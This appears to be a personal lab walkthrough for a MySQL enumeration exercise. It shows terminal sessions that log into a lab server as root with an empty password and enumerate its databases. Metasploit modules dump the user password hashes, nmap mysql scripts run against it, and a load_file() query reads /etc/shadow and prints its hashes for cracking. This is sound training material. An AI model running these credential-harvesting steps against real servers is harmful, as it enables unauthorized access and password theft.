### SQL1

1. What is the version of MySQL server?
2. What command is used to connect to remote MySQL database?
3. How many databases are present on the database server?
4. How many records are present in table “authors”? This table is present inside the “books” database.
5. Dump the schema of all databases from the server using suitable metasploit module?
6. How many directories present in the /usr/share/metasploit-framework/data/wordlists/directory.txt, are writable? List the names.
7. How many of sensitive files present in /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt are readable? List the names.
8. Find the system password hash for user "root".
9. How many database users are present on the database server? Lists their names and password hashes.
10. Check whether anonymous login is allowed on MySQL Server.
11. Check whether “InteractiveClient” capability is supported on the MySQL server.
12. Enumerate the users present on MySQL database server using mysql-users nmap script.
13. List all databases stored on the MySQL Server using nmap script.
14. Find the data directory used by mysql server using nmap script.
15. Check whether File Privileges can be granted to non admin users using mysql_audi nmap script.
16. Dump all user hashes using  nmap script.
17. Find the number of records stored in table “authors” in database “books” stored on MySQL Server using mysql-query nmap script.

[[ip]]

```
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
5011: eth0@if5012: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:04 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.4/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
5014: eth1@if5015: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:19:a9:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.25.169.2/24 brd 192.25.169.255 scope global eth1
       valid_lft forever preferred_lft forever
```

[[ping]]

```
root@attackdefense:~# ping -c 5 192.25.169.3
PING 192.25.169.3 (192.25.169.3) 56(84) bytes of data.
64 bytes from 192.25.169.3: icmp_seq=1 ttl=64 time=0.087 ms
64 bytes from 192.25.169.3: icmp_seq=2 ttl=64 time=0.080 ms
64 bytes from 192.25.169.3: icmp_seq=3 ttl=64 time=0.058 ms
64 bytes from 192.25.169.3: icmp_seq=4 ttl=64 time=0.052 ms
64 bytes from 192.25.169.3: icmp_seq=5 ttl=64 time=0.058 ms

--- 192.25.169.3 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 105ms
rtt min/avg/max/mdev = 0.052/0.067/0.087/0.013 ms
```

[[Hack2.0/NMAP#General Scan|NMAP scan]]

```
root@attackdefense:~# nmap 192.25.169.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-10 17:35 UTC
Nmap scan report for target-1 (192.25.169.3)
Host is up (0.000013s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql
MAC Address: 02:42:C0:19:A9:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

[[Hack2.0/NMAP#Service version|NMAP service version]]

```
root@attackdefense:~# nmap -p3306 -sV -O 192.25.169.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-10 17:36 UTC
Nmap scan report for target-1 (192.25.169.3)
Host is up (0.000052s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
MAC Address: 02:42:C0:19:A9:03 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Netgear RAIDiator 4.2.28 (94%), Linux 2.6.32 - 2.6.35 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.12 seconds
```

[[Servers and Services#SQL|SQL]]

```
root@attackdefense:~# mysql -h 192.25.169.3 -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 45
Server version: 5.5.62-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| books              |
| data               |
| mysql              |
| password           |
| performance_schema |
| secret             |
| store              |
| upload             |
| vendors            |
| videos             |
+--------------------+
11 rows in set (0.000 sec)

MySQL [(none)]> use books;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [books]> show tables;
+-----------------+
| Tables_in_books |
+-----------------+
| authors         |
+-----------------+
1 row in set (0.000 sec)

MySQL [books]> select * from authors;
+----+------------+-----------+-----------------------------+------------+---------------------+
| id | first_name | last_name | email                       | birthdate  | added               |
+----+------------+-----------+-----------------------------+------------+---------------------+
|  1 | Gregoria   | Lowe      | gutmann.rebekah@example.net | 1982-03-09 | 1983-01-11 11:25:43 |
|  2 | Ona        | Anderson  | ethelyn02@example.net       | 1980-06-02 | 1972-05-05 07:26:52 |
|  3 | Emile      | Lakin     | rippin.freda@example.com    | 1979-04-06 | 2010-05-30 20:03:07 |
|  4 | Raul       | Barton    | mschiller@example.com       | 1976-05-06 | 1979-02-08 12:32:29 |
|  5 | Sofia      | Collier   | rodrigo34@example.net       | 1978-06-09 | 1991-05-01 10:02:54 |
|  6 | Wellington | Fay       | jared98@example.com         | 2011-08-11 | 1992-05-27 23:20:20 |
|  7 | Garnet     | Braun     | hickle.howell@example.net   | 1990-04-27 | 2010-04-13 09:48:36 |
|  8 | Alessia    | Kuphal    | skiles.reggie@example.net   | 1978-04-06 | 2014-08-22 21:23:00 |
|  9 | Deven      | Carroll   | savanah.zulauf@example.net  | 2007-02-15 | 1998-02-16 11:45:32 |
| 10 | Issac      | Stanton   | ozella10@example.net        | 2013-10-13 | 1976-12-09 13:18:45 |
+----+------------+-----------+-----------------------------+------------+---------------------+
10 rows in set (0.000 sec)

MySQL [books]> help

General information about MariaDB can be found at
http://mariadb.org

List of all MySQL commands:
Note that all text commands must be first on line and end with ';'
?         (\?) Synonym for `help'.
clear     (\c) Clear the current input statement.
connect   (\r) Reconnect to the server. Optional arguments are db and host.
delimiter (\d) Set statement delimiter.
edit      (\e) Edit command with $EDITOR.
ego       (\G) Send command to mysql server, display result vertically.
exit      (\q) Exit mysql. Same as quit.
go        (\g) Send command to mysql server.
help      (\h) Display this help.
nopager   (\n) Disable pager, print to stdout.
notee     (\t) Don't write into outfile.
pager     (\P) Set PAGER [to_pager]. Print the query results via PAGER.
print     (\p) Print current command.
prompt    (\R) Change your mysql prompt.
quit      (\q) Quit mysql.
rehash    (\#) Rebuild completion hash.
source    (\.) Execute an SQL script file. Takes a file name as an argument.
status    (\s) Get status information from the server.
system    (\!) Execute a system shell command.
tee       (\T) Set outfile [to_outfile]. Append everything into given outfile.
use       (\u) Use another database. Takes database name as argument.
charset   (\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets.
warnings  (\W) Show warnings after every statement.
nowarning (\w) Don't show warnings after every statement.

For server side help, type 'help contents'

MySQL [books]>
```

[[metasploit]]

```
msf5 > search mysql

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank       Check  Description
   -   ----                                                  ---------------  ----       -----  -----------
   1   auxiliary/admin/http/manageengine_pmp_privesc         2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   2   auxiliary/admin/http/rails_devise_pass_reset          2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset
   3   auxiliary/admin/mysql/mysql_enum                                       normal     No     MySQL Enumeration Module
   4   auxiliary/admin/mysql/mysql_sql                                        normal     No     MySQL SQL Generic Query
   5   auxiliary/admin/tikiwiki/tikidblib                    2006-11-01       normal     No     TikiWiki Information Disclosure
   6   auxiliary/analyze/jtr_mysql_fast                                       normal     No     John the Ripper MySQL Password Cracker (Fast Mode)
   7   auxiliary/gather/joomla_weblinks_sqli                 2014-03-02       normal     Yes    Joomla weblinks-categories Unauthenticated SQL Injection Arbitrary File Read
   8   auxiliary/scanner/mysql/mysql_authbypass_hashdump     2012-06-09       normal     Yes    MySQL Authentication Bypass Password Dump
   9   auxiliary/scanner/mysql/mysql_file_enum                                normal     Yes    MYSQL File/Directory Enumerator
   10  auxiliary/scanner/mysql/mysql_hashdump                                 normal     Yes    MYSQL Password Hashdump
   11  auxiliary/scanner/mysql/mysql_login                                    normal     Yes    MySQL Login Utility
   12  auxiliary/scanner/mysql/mysql_schemadump                               normal     Yes    MYSQL Schema Dump
   13  auxiliary/scanner/mysql/mysql_version                                  normal     Yes    MySQL Server Version Enumeration
   14  auxiliary/scanner/mysql/mysql_writable_dirs                            normal     Yes    MYSQL Directory Write Test
   15  auxiliary/server/capture/mysql                                         normal     No     Authentication Capture: MySQL
   16  exploit/linux/mysql/mysql_yassl_getname               2010-01-25       good       No     MySQL yaSSL CertDecoder::GetName Buffer Overflow
   17  exploit/linux/mysql/mysql_yassl_hello                 2008-01-04       good       No     MySQL yaSSL SSL Hello Message Buffer Overflow
   18  exploit/multi/http/manage_engine_dc_pmp_sqli          2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   19  exploit/multi/http/zpanel_information_disclosure_rce  2014-01-30       excellent  No     Zpanel Remote Unauthenticated RCE
   20  exploit/multi/mysql/mysql_udf_payload                 2009-01-16       excellent  No     Oracle MySQL UDF Payload Execution
   21  exploit/unix/webapp/kimai_sqli                        2013-05-21       average    Yes    Kimai v0.9.2 'db_restore.php' SQL Injection
   22  exploit/unix/webapp/wp_google_document_embedder_exec  2013-01-03       normal     Yes    WordPress Plugin Google Document Embedder Arbitrary File Disclosure
   23  exploit/windows/mysql/mysql_mof                       2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows MOF Execution
   24  exploit/windows/mysql/mysql_start_up                  2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows FILE Privilege Abuse
   25  exploit/windows/mysql/mysql_yassl_hello               2008-01-04       average    No     MySQL yaSSL SSL Hello Message Buffer Overflow
   26  exploit/windows/mysql/scrutinizer_upload_exec         2012-07-27       excellent  Yes    Plixer Scrutinizer NetFlow and sFlow Analyzer 9 Default MySQL Credential
   27  post/linux/gather/enum_configs                                         normal     No     Linux Gather Configurations
   28  post/linux/gather/enum_users_history                                   normal     No     Linux Gather User History
   29  post/multi/manage/dbvis_add_db_admin                                   normal     No     Multi Manage DbVisualizer Add Db Admin


msf5 > use auxiliary/scanner/mysql/mysql_writable_dirs
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > options

Module options (auxiliary/scanner/mysql/mysql_writable_dirs):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DIR_LIST                    yes       List of directories to test
   FILE_NAME  cGNAJfGt         yes       Name of file to write
   PASSWORD                    no        The password for the specified username
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      3306             yes       The target port (TCP)
   THREADS    1                yes       The number of concurrent threads
   USERNAME   root             yes       The username to authenticate as

msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > set rhosts 192.25.169.3
rhosts => 192.25.169.3
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
dir_list => /usr/share/metasploit-framework/data/wordlists/directory.txt
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > run

[!] 192.25.169.3:3306     - For every writable directory found, a file called cGNAJfGt with the text test will be written to the directory.
[*] 192.25.169.3:3306     - Login...
[*] 192.25.169.3:3306     - Checking /tmp...
[+] 192.25.169.3:3306     - /tmp is writeable
[*] 192.25.169.3:3306     - Checking /etc/passwd...
[!] 192.25.169.3:3306     - Can't create/write to file '/etc/passwd/cGNAJfGt' (Errcode: 20)
[*] 192.25.169.3:3306     - Checking /etc/shadow...
[!] 192.25.169.3:3306     - Can't create/write to file '/etc/shadow/cGNAJfGt' (Errcode: 20)
[*] 192.25.169.3:3306     - Checking /root...
[+] 192.25.169.3:3306     - /root is writeable
[*] 192.25.169.3:3306     - Checking /home...
[!] 192.25.169.3:3306     - Can't create/write to file '/home/cGNAJfGt' (Errcode: 13)
[*] 192.25.169.3:3306     - Checking /etc...
[!] 192.25.169.3:3306     - Can't create/write to file '/etc/cGNAJfGt' (Errcode: 13)
[*] 192.25.169.3:3306     - Checking /etc/hosts...
[!] 192.25.169.3:3306     - Can't create/write to file '/etc/hosts/cGNAJfGt' (Errcode: 20)
[*] 192.25.169.3:3306     - Checking /usr/share...
[!] 192.25.169.3:3306     - Can't create/write to file '/usr/share/cGNAJfGt' (Errcode: 13)
[*] 192.25.169.3:3306     - Checking /etc/config...
[!] 192.25.169.3:3306     - Can't create/write to file '/etc/config/cGNAJfGt' (Errcode: 2)
[*] 192.25.169.3:3306     - Checking /data...
[!] 192.25.169.3:3306     - Can't create/write to file '/data/cGNAJfGt' (Errcode: 2)
[*] 192.25.169.3:3306     - Checking /webdav...
[!] 192.25.169.3:3306     - Can't create/write to file '/webdav/cGNAJfGt' (Errcode: 2)
[*] 192.25.169.3:3306     - Checking /doc...
[!] 192.25.169.3:3306     - Can't create/write to file '/doc/cGNAJfGt' (Errcode: 2)
[*] 192.25.169.3:3306     - Checking /icons...
[!] 192.25.169.3:3306     - Can't create/write to file '/icons/cGNAJfGt' (Errcode: 2)
[*] 192.25.169.3:3306     - Checking /manual...
[!] 192.25.169.3:3306     - Can't create/write to file '/manual/cGNAJfGt' (Errcode: 2)
[*] 192.25.169.3:3306     - Checking /pro...
[!] 192.25.169.3:3306     - Can't create/write to file '/pro/cGNAJfGt' (Errcode: 2)
[*] 192.25.169.3:3306     - Checking /secure...
[!] 192.25.169.3:3306     - Can't create/write to file '/secure/cGNAJfGt' (Errcode: 2)
[*] 192.25.169.3:3306     - Checking /poc...
[!] 192.25.169.3:3306     - Can't create/write to file '/poc/cGNAJfGt' (Errcode: 2)
[*] 192.25.169.3:3306     - Checking /pro...
[!] 192.25.169.3:3306     - Can't create/write to file '/pro/cGNAJfGt' (Errcode: 2)
[*] 192.25.169.3:3306     - Checking /dir...
[!] 192.25.169.3:3306     - Can't create/write to file '/dir/cGNAJfGt' (Errcode: 2)
[*] 192.25.169.3:3306     - Checking /Benefits...
[!] 192.25.169.3:3306     - Can't create/write to file '/Benefits/cGNAJfGt' (Errcode: 2)
[*] 192.25.169.3:3306     - Checking /Data...
[!] 192.25.169.3:3306     - Can't create/write to file '/Data/cGNAJfGt' (Errcode: 2)
[*] 192.25.169.3:3306     - Checking /Invitation...
[!] 192.25.169.3:3306     - Can't create/write to file '/Invitation/cGNAJfGt' (Errcode: 2)
[*] 192.25.169.3:3306     - Checking /Office...
[!] 192.25.169.3:3306     - Can't create/write to file '/Office/cGNAJfGt' (Errcode: 2)
[*] 192.25.169.3:3306     - Checking /Site...
[!] 192.25.169.3:3306     - Can't create/write to file '/Site/cGNAJfGt' (Errcode: 2)
[*] 192.25.169.3:3306     - Checking /Admin...
[!] 192.25.169.3:3306     - Can't create/write to file '/Admin/cGNAJfGt' (Errcode: 2)
[*] 192.25.169.3:3306     - Checking /etc...
[!] 192.25.169.3:3306     - Can't create/write to file '/etc/cGNAJfGt' (Errcode: 13)
[*] 192.25.169.3:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) >
```

Using different module from the list called hashdump

```
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > use auxiliary/scanner/mysql/mysql_hashdump
msf5 auxiliary(scanner/mysql/mysql_hashdump) > options

Module options (auxiliary/scanner/mysql/mysql_hashdump):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        The password for the specified username
   RHOSTS                     yes       The target address range or CIDR identifier
   RPORT     3306             yes       The target port (TCP)
   THREADS   1                yes       The number of concurrent threads
   USERNAME                   no        The username to authenticate as

msf5 auxiliary(scanner/mysql/mysql_hashdump) > set rhosts 192.25.169.3
rhosts => 192.25.169.3
msf5 auxiliary(scanner/mysql/mysql_hashdump) > set username root
username => root
msf5 auxiliary(scanner/mysql/mysql_hashdump) > set password ""
password => 
msf5 auxiliary(scanner/mysql/mysql_hashdump) > run

[+] 192.25.169.3:3306     - Saving HashString as Loot: root:
[+] 192.25.169.3:3306     - Saving HashString as Loot: root:
[+] 192.25.169.3:3306     - Saving HashString as Loot: root:
[+] 192.25.169.3:3306     - Saving HashString as Loot: root:
[+] 192.25.169.3:3306     - Saving HashString as Loot: debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D
[+] 192.25.169.3:3306     - Saving HashString as Loot: root:
[+] 192.25.169.3:3306     - Saving HashString as Loot: filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
[+] 192.25.169.3:3306     - Saving HashString as Loot: ultra:*827EC562775DC9CE458689D36687DCED320F34B0
[+] 192.25.169.3:3306     - Saving HashString as Loot: guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
[+] 192.25.169.3:3306     - Saving HashString as Loot: sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
[+] 192.25.169.3:3306     - Saving HashString as Loot: udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9
[+] 192.25.169.3:3306     - Saving HashString as Loot: sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14
[*] 192.25.169.3:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
msf5 > use auxiliary/scanner/mysql/mysql_file_enum
msf5 auxiliary(scanner/mysql/mysql_file_enum) > options

Module options (auxiliary/scanner/mysql/mysql_file_enum):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   DATABASE_NAME  mysql            yes       Name of database to use
   FILE_LIST                       yes       List of directories to enumerate
   PASSWORD                        no        The password for the specified username
   RHOSTS                          yes       The target address range or CIDR identifier
   RPORT          3306             yes       The target port (TCP)
   TABLE_NAME     kMUbuQIh         yes       Name of table to use - Warning, if the table already exists its contents will be corrupted
   THREADS        1                yes       The number of concurrent threads
   USERNAME       root             yes       The username to authenticate as

msf5 auxiliary(scanner/mysql/mysql_file_enum) > set rhosts 192.25.169.3
rhosts => 192.25.169.3
msf5 auxiliary(scanner/mysql/mysql_file_enum) > set file_list /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
file_list => /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
msf5 auxiliary(scanner/mysql/mysql_file_enum) > run

[+] 192.25.169.3:3306     - /etc/passwd is a file and exists
[+] 192.25.169.3:3306     - /etc/shadow is a file and exists
[+] 192.25.169.3:3306     - /etc/group is a file and exists
[+] 192.25.169.3:3306     - /etc/mysql/my.cnf is a file and exists
[+] 192.25.169.3:3306     - /etc/hosts is a file and exists
[+] 192.25.169.3:3306     - /etc/hosts.allow is a file and exists
[+] 192.25.169.3:3306     - /etc/hosts.deny is a file and exists
[+] 192.25.169.3:3306     - /etc/issue is a file and exists
[+] 192.25.169.3:3306     - /etc/fstab is a file and exists
[+] 192.25.169.3:3306     - /proc/version is a file and exists
[*] 192.25.169.3:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/mysql/mysql_file_enum) 
```

All the files listed in the above are read by msfconsole meaning we can as well access those files in general if we are to login from mysql. Let us give it a try and see the first and absolute file that we should not have access to. Any guesses yeaaa it is shadow file.

```
root@attackdefense:~# mysql -h 192.25.169.3 -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 50
Server version: 5.5.62-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> select load_file("/etc/shadow");
| load_file("/etc/shadow")                                                                                                                                                                                                           root:$6$eoOI5IAu$S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/:17861:0:99999:7:::
daemon:*:17850:0:99999:7:::
bin:*:17850:0:99999:7:::
sys:*:17850:0:99999:7:::
sync:*:17850:0:99999:7:::
games:*:17850:0:99999:7:::
man:*:17850:0:99999:7:::
lp:*:17850:0:99999:7:::
mail:*:17850:0:99999:7:::
news:*:17850:0:99999:7:::
uucp:*:17850:0:99999:7:::
proxy:*:17850:0:99999:7:::
www-data:*:17850:0:99999:7:::
backup:*:17850:0:99999:7:::
list:*:17850:0:99999:7:::
irc:*:17850:0:99999:7:::
gnats:*:17850:0:99999:7:::
nobody:*:17850:0:99999:7:::
libuuid:!:17850:0:99999:7:::
syslog:*:17850:0:99999:7:::
mysql:!:17857:0:99999:7:::
dbadmin:$6$vZ3Fv3x6$qdB/lOAC1EtlKEC2H8h5f7t33j65WDbHHV50jloFkxFBeQC8QkdbQKpHEp/BkVMQD2C2AFPkYW3.W7jMlMbl5.:17861:0:99999:7:::
1 row in set (0.000 sec)

MySQL [(none)]> 
```

Lucky me able to get the shadow file just need to run these hashes and get them cracking.

Empty password accounts

```
root@attackdefense:~# nmap -p3306 --script mysql-empty-password 192.25.169.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-10 18:15 UTC
Nmap scan report for target-1 (192.25.169.3)
Host is up (0.000033s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-empty-password: 
|_  root account has empty password
MAC Address: 02:42:C0:19:A9:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
```

```
root@attackdefense:~# nmap -p3306 --script mysql-info 192.25.169.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-10 18:16 UTC
Nmap scan report for target-1 (192.25.169.3)
Host is up (0.000052s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.62-0ubuntu0.14.04.1
|   Thread ID: 53
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, ODBCClient, InteractiveClient, SupportsTransactions, DontAllowDatabaseTableColumn, ConnectWithDatabase, LongColumnFlag, IgnoreSigpipes, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, Speaks41ProtocolOld, FoundRows, SupportsCompression, LongPassword, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: .1Moe1_m'u:_QV=n4T.%
|_  Auth Plugin Name: 96
MAC Address: 02:42:C0:19:A9:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
```

```
root@attackdefense:~# nmap -p3306 --script mysql-users --script-args mysqluser='root',mysqlpass='' 192.25.169.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-10 18:18 UTC
Nmap scan report for target-1 (192.25.169.3)
Host is up (0.000032s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-users: 
|   filetest
|   root
|   debian-sys-maint
|   guest
|   sigver
|   sysadmin
|   udadmin
|_  ultra
MAC Address: 02:42:C0:19:A9:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
```

```
root@attackdefense:~# nmap -p3306 --script mysql-databases --script-args mysqluser='root',mysqlpass='' 192.25.169.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-10 18:19 UTC
Nmap scan report for target-1 (192.25.169.3)
Host is up (0.000031s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-databases: 
|   information_schema
|   books
|   data
|   mysql
|   password
|   performance_schema
|   secret
|   store
|   upload
|   vendors
|_  videos
MAC Address: 02:42:C0:19:A9:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
```

```
root@attackdefense:~# nmap -p3306 --script mysql-variables --script-args mysqluser='root',mysqlpass='' 192.25.169.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-10 18:20 UTC
Nmap scan report for target-1 (192.25.169.3)
Host is up (0.000033s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-variables: 
|   auto_increment_increment: 1
|   auto_increment_offset: 1
|   autocommit: ON
|   automatic_sp_privileges: ON
|   back_log: 50
|   basedir: /usr
|   big_tables: OFF
|   binlog_cache_size: 32768
|   binlog_direct_non_transactional_updates: OFF
|   binlog_format: STATEMENT
|   binlog_stmt_cache_size: 32768
|   bulk_insert_buffer_size: 8388608
|   character_set_client: latin1
|   character_set_connection: latin1
|   character_set_database: latin1
|   character_set_filesystem: binary
|   character_set_results: latin1
|   character_set_server: latin1
|   character_set_system: utf8
|   character_sets_dir: /usr/share/mysql/charsets/
|   collation_connection: latin1_swedish_ci
|   collation_database: latin1_swedish_ci
|   collation_server: latin1_swedish_ci
|   completion_type: NO_CHAIN
|   concurrent_insert: AUTO
|   connect_timeout: 10
|   datadir: /var/lib/mysql/
|   date_format: %Y-%m-%d
|   datetime_format: %Y-%m-%d %H:%i:%s
|   default_storage_engine: InnoDB
|   default_week_format: 0
|   delay_key_write: ON
|   delayed_insert_limit: 100
|   delayed_insert_timeout: 300
|   delayed_queue_size: 1000
|   div_precision_increment: 4
|   engine_condition_pushdown: ON
|   error_count: 0
|   event_scheduler: OFF
|   expire_logs_days: 10
|   external_user: 
|   flush: OFF
|   flush_time: 0
|   foreign_key_checks: ON
|   ft_boolean_syntax: + -><()~*:""&|
|   ft_max_word_len: 84
|   ft_min_word_len: 4
|   ft_query_expansion_limit: 20
|   ft_stopword_file: (built-in)
|   general_log: OFF
|   general_log_file: /var/lib/mysql/victim-1.log
|   group_concat_max_len: 1024
|   have_compress: YES
|   have_crypt: YES
|   have_csv: YES
|   have_dynamic_loading: YES
|   have_geometry: YES
|   have_innodb: YES
|   have_ndbcluster: NO
|   have_openssl: DISABLED
|   have_partitioning: YES
|   have_profiling: YES
|   have_query_cache: YES
|   have_rtree_keys: YES
|   have_ssl: DISABLED
|   have_symlink: YES
|   hostname: victim-1
|   identity: 0
|   ignore_builtin_innodb: OFF
|   init_connect: 
|   init_file: 
|   init_slave: 
|   innodb_adaptive_flushing: ON
|   innodb_adaptive_hash_index: ON
|   innodb_additional_mem_pool_size: 8388608
|   innodb_autoextend_increment: 8
|   innodb_autoinc_lock_mode: 1
|   innodb_buffer_pool_instances: 1
|   innodb_buffer_pool_size: 134217728
|   innodb_change_buffering: all
|   innodb_checksums: ON
|   innodb_commit_concurrency: 0
|   innodb_concurrency_tickets: 500
|   innodb_data_file_path: ibdata1:10M:autoextend
|   innodb_data_home_dir: 
|   innodb_doublewrite: ON
|   innodb_fast_shutdown: 1
|   innodb_file_format: Antelope
|   innodb_file_format_check: ON
|   innodb_file_format_max: Antelope
|   innodb_file_per_table: OFF
|   innodb_flush_log_at_trx_commit: 1
|   innodb_flush_method: 
|   innodb_force_load_corrupted: OFF
|   innodb_force_recovery: 0
|   innodb_io_capacity: 200
|   innodb_large_prefix: OFF
|   innodb_lock_wait_timeout: 50
|   innodb_locks_unsafe_for_binlog: OFF
|   innodb_log_buffer_size: 8388608
|   innodb_log_file_size: 5242880
|   innodb_log_files_in_group: 2
|   innodb_log_group_home_dir: ./
|   innodb_max_dirty_pages_pct: 75
|   innodb_max_purge_lag: 0
|   innodb_mirrored_log_groups: 1
|   innodb_old_blocks_pct: 37
|   innodb_old_blocks_time: 0
|   innodb_open_files: 300
|   innodb_print_all_deadlocks: OFF
|   innodb_purge_batch_size: 20
|   innodb_purge_threads: 0
|   innodb_random_read_ahead: OFF
|   innodb_read_ahead_threshold: 56
|   innodb_read_io_threads: 4
|   innodb_replication_delay: 0
|   innodb_rollback_on_timeout: OFF
|   innodb_rollback_segments: 128
|   innodb_spin_wait_delay: 6
|   innodb_stats_method: nulls_equal
|   innodb_stats_on_metadata: ON
|   innodb_stats_sample_pages: 8
|   innodb_strict_mode: OFF
|   innodb_support_xa: ON
|   innodb_sync_spin_loops: 30
|   innodb_table_locks: ON
|   innodb_thread_concurrency: 0
|   innodb_thread_sleep_delay: 10000
|   innodb_use_native_aio: ON
|   innodb_use_sys_malloc: ON
|   innodb_version: 5.5.62
|   innodb_write_io_threads: 4
|   insert_id: 0
|   interactive_timeout: 28800
|   join_buffer_size: 131072
|   keep_files_on_create: OFF
|   key_buffer_size: 16777216
|   key_cache_age_threshold: 300
|   key_cache_block_size: 1024
|   key_cache_division_limit: 100
|   large_files_support: ON
|   large_page_size: 0
|   large_pages: OFF
|   last_insert_id: 0
|   lc_messages: en_US
|   lc_messages_dir: /usr/share/mysql/
|   lc_time_names: en_US
|   license: GPL
|   local_infile: ON
|   lock_wait_timeout: 31536000
|   locked_in_memory: OFF
|   log: OFF
|   log_bin: OFF
|   log_bin_trust_function_creators: OFF
|   log_error: /var/log/mysql/error.log
|   log_output: FILE
|   log_queries_not_using_indexes: OFF
|   log_slave_updates: OFF
|   log_slow_queries: OFF
|   log_warnings: 1
|   long_query_time: 10.000000
|   low_priority_updates: OFF
|   lower_case_file_system: OFF
|   lower_case_table_names: 0
|   max_allowed_packet: 16777216
|   max_binlog_cache_size: 18446744073709547520
|   max_binlog_size: 104857600
|   max_binlog_stmt_cache_size: 18446744073709547520
|   max_connect_errors: 10
|   max_connections: 151
|   max_delayed_threads: 20
|   max_error_count: 64
|   max_heap_table_size: 16777216
